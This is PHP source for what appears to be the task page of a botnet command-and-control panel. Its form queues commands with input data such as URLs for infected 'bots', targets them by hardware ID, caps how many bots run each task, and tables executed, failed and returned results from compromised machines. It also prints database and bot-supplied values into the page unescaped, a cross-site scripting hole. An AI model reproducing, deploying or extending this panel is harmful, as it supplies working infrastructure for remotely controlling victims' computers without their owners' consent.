<?php
include_once("config.php");
$current_view_page = 1;
$comp_page = 1;
if(isset($_POST['create_task'])){
	
	if(!empty($_POST['task_opt']) && !empty($_POST['input_data']) && isset($_POST['maxbots'])){
		$task_opt = $_POST['task_opt'];
		$input_data = $_POST['input_data'];
		$maxbots = $_POST['maxbots'];
		$hwid = "";
		if(!empty($_POST['hwid'])){
			$hwid = $_POST['hwid'];
		}
		$create_task_query = "INSERT INTO `tasks` (`cmd_num`, `cmd`, `maxbots`, `HWID`, `time_added`) VALUES (:cmdnum, :cmd, :maxbots, :hwid, CURRENT_TIMESTAMP)";
		$db = connection();
		if($sth = $db->prepare($create_task_query)){
			$sth->bindParam(":cmdnum", $task_opt);
			$sth->bindParam(":cmd", $input_data);
			$sth->bindParam(":maxbots", $maxbots);
			$sth->bindParam(":hwid", $hwid);
			$sth->execute();
		}
	}
}
if(!empty($_GET['view_page'])){
	$current_view_page = $_GET['view_page'];
}
if(!empty($_GET['comp_page'])){
	$comp_page = $_GET['comp_page'];
}
function GetTasks($page){
	if(($page -1) < 0){
		return;
	}
	$offset = ($page -1) * 10;
	$get_tasks = "SELECT * FROM `tasks` ORDER BY `time_added` DESC LIMIT 10 OFFSET :task_offset";
	$db = connection();
	if($sth = $db->prepare($get_tasks)){
		$sth->bindParam(":task_offset", $offset, PDO::PARAM_INT);
		$sth->execute();
		while($row = $sth->fetch(PDO::FETCH_ASSOC)){
			$cur_hwid = "No";
			if($row["HWID"] != ""){
				$cur_hwid = $row["HWID"];
			}
			echo "<tr><td>".$row["id"]."</td><td>".$cur_hwid."</td><td>".$row["cmd"]."</td><td>".$row["executed"]."</td><td>".$row["failed"]."</td><td>".$row["status"]."</td><td><a  href=\"taskmanage.php?task_id=".$row["id"]."\" type=\"submit\" class=\"add btn btn-primary\">Manage</a></td></tr>";
			
		}
	}
}
function GetCompleteTasks($page){
	if(($page -1) < 0){
		return;
	}
	$offset = ($page -1) * 10;
	$get_tasks = "SELECT * FROM `complete_tasks` ORDER BY `time_added` DESC LIMIT 10 OFFSET :task_offset";
	$db = connection();
	if($sth = $db->prepare($get_tasks)){
		$sth->bindParam(":task_offset", $offset, PDO::PARAM_INT);
		$sth->execute();
		while($row = $sth->fetch(PDO::FETCH_ASSOC)){
			
			echo "<tr><td>".$row["cmd_id"]."</td><td>".$row["HWID"]."</td><td>".$row["result"]."</td><td>".$row["time_executed"]."</td><td><a  href=\"tasks.php?remove=".$row["id"]."\" type=\"submit\" class=\"add btn btn-primary\">Remove</a></td></tr>";
			
		}
	}
}
function GetTotalTasks(){
	$total_tasks_query  = "SELECT * FROM `tasks`";
	$db = connection();
	if($sth = $db->prepare($total_tasks_query)){
		$sth->execute();
		return $sth->rowCount();
	}
	return 0;
}
function GetTotalCompleteTasks(){
	$complete_tasks_query = "SELECT * FROM `complete_tasks`";
	$db = connection();
	if($sth = $db->prepare($complete_tasks_query)){
		$sth->execute();
		return $sth->rowCount();
	}
	return 0;
}

$total_tasks = GetTotalTasks();
$complete_tasks = GetTotalCompleteTasks();
?>

<!DOCTYPE html>
<html lang="en">
<?php
include_once("header.php");
?>
<body class="sidebar-dark">
  <div class="container-scroller">
    <!-- partial:partials/_navbar.html -->
    <nav class="navbar col-lg-12 col-12 p-0 fixed-top d-flex flex-row">
      <div class="text-center navbar-brand-wrapper d-flex align-items-center justify-content-center">
      </div>
      <div class="navbar-menu-wrapper d-flex align-items-center justify-content-end">
   
        <ul class="navbar-nav navbar-nav-right">
        
          <li class="nav-item nav-profile dropdown">
            <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" id="profileDropdown">
              Options
            </a>
            <div class="dropdown-menu dropdown-menu-right navbar-dropdown" aria-labelledby="profileDropdown">
             
              <a class="dropdown-item">
                <i class="ti-power-off text-primary"></i>
                Logout
              </a>
            </div>
          </li>
        
        </ul>
        <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
          <span class="ti-layout-grid2"></span>
        </button>
      </div>
    </nav>
    <!-- partial -->
    <div class="container-fluid page-body-wrapper">
      <!-- partial:partials/_settings-panel.html -->
   
      <!-- partial -->
      <!-- partial:partials/_sidebar.html -->
   <?php
   
   include_once("sidebar.php");
   
   ?>
      <!-- partial -->
      <div class="main-panel">
        <div class="content-wrapper">
      <div class="row">
	  <div class="col-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Create Task</h4>
                 
                  <form class="forms-sample" method="POST">
                   
                    <div class="form-group">
                      <label for="task_opt">Task Option</label>
                        <select class="form-control" id="task_opt" name="task_opt">
						<?php
						
					   foreach($task_array as $index => $task){
						   echo "<option value=".$index.">".$task."</option>";
					   }
						?>
                        </select>
                      </div>
                    
					<div class="form-group">
                      <label for="input_data">Input Data</label>
                      <input type="text" class="form-control" id="input_data" placeholder="url... etc if applicable" name="input_data">
                    </div>
                    <div class="form-group">
                      <label for="input_data">Input HWID</label>
                      <input type="text" class="form-control" id="input_data" placeholder="HWID if you want to select specific bot" name="hwid">
                    </div>
					
					<div class="form-group">
                      <label for="input_data">Specify MAX bots</label>
                      <input type="number" class="form-control" id="input_data" placeholder="leave this empty if you want max" name="maxbots">
                    </div>
                    <button type="submit" class="btn btn-primary mr-2" name="create_task">Submit</button>
                  </form>
                </div>
              </div>
            </div>
	  
	  
	  </div>
		  <div class="row">
		  
            <div class="col-lg-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Current Task Info</h4>
				
                  <div class="table-responsive pt-3">
				  
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>
                            Task ID
                          </th>
                          <th>
                            Specific HWID?
                          </th>
                          <th>
                            Command Data
                          </th>
                          <th>
                            Executed
                          </th>
                          <th>
                            Failed
                          </th>
                          <th>
                            Current Status
                          </th>
                          <th>
                            Manage
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                       <?php
					   
					   GetTasks($current_view_page);
					   ?>
                      </tbody>
                    </table>
                  </div>
				   
				   <p class="card-description">View Page</p>
                  <select name="page" onChange="window.location.href=this.value;">
				  <?php
				  $task_pages = $total_tasks / 10;
				  
				   for($cur_page = 1; $cur_page < $task_pages; $cur_page++){
					  if($cur_page == $current_view_page){
					  echo "<option value=\"tasks.php?comp_page=".$comp_page."&view_page=".$cur_page."\" selected=\"selected\">".$cur_page."</option>";
					  }
					  else{
					  echo "<option value=\"tasks.php?comp_page=".$comp_page."&view_page=".$cur_page."\">".$cur_page."</option>";
					  }
					  
				  }
				  ?>
                  </select>
				   
                </div>
              </div>
            </div>
		  
            <div class="col-lg-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Complete Tasks</h4>
				
                  <div class="table-responsive pt-3">
				  
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>
                            Task ID
                          </th>
                          <th>
                            HWID
                          </th>
                          <th>
                            Result
                          </th>
                          <th>
                            Time Executed
                          </th>
                          <th>
                            Remove Entry
                          </th>
                          
                        </tr>
                      </thead>
                      <tbody>
                       <?php
					   GetCompleteTasks($comp_page);
					   
					   ?>
                      </tbody>
                    </table>
                  </div>
				   
				   <p class="card-description">View Page</p>
                  <select name="page" onChange="window.location.href=this.value;">
				  <?php
				  $comp_pages = $complete_tasks / 10;
				  
				  for($cur_page = 1; $cur_page < $comp_pages; $cur_page++){
					  if($cur_page == $comp_page){
					  echo "<option value=\"tasks.php?comp_page=".$cur_page."&view_page=".$current_view_page."\" selected=\"selected\">".$cur_page."</option>";
					  }
					  else{
					  echo "<option value=\"tasks.php?comp_page=".$cur_page."&view_page=".$current_view_page."\">".$cur_page."</option>";
					  }
					  
				  }
				  ?>
                  </select>
                </div>
              </div>
            </div>
		  </div>
        
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
   
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->

  <!-- plugins:js -->
  <script src="vendors/js/vendor.bundle.base.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page -->
  <script src="vendors/chart.js/Chart.min.js"></script>
  <!-- End plugin js for this page -->
  <!-- inject:js -->
  <script src="js/off-canvas.js"></script>
  <script src="js/hoverable-collapse.js"></script>
  <script src="js/template.js"></script>
  <script src="js/settings.js"></script>
  <script src="js/todolist.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <script src="js/dashboard.js"></script>
  <!-- End custom js for this page-->
</body>

</html>

